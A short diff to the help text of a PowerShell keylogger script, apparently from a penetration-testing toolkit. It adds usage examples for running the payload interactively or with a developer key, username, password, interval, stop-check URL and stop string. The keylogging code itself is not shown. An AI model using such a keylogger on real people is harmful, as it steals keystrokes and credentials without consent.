@@ -35,7 +35,12 @@ The string which when found at CheckURL will stop the keylogger.
 The URL which would contain the MagicString used to stop keylogging.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 3 <dev_key> <username> <pass>
+PS > .\Keylogger.ps1
+The payload will ask for all required options.
+
+.EXAMPLE
+PS > .\Keylogger.ps1 <dev_key> <username> <pass> 3 http://example.com stopthis
+Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
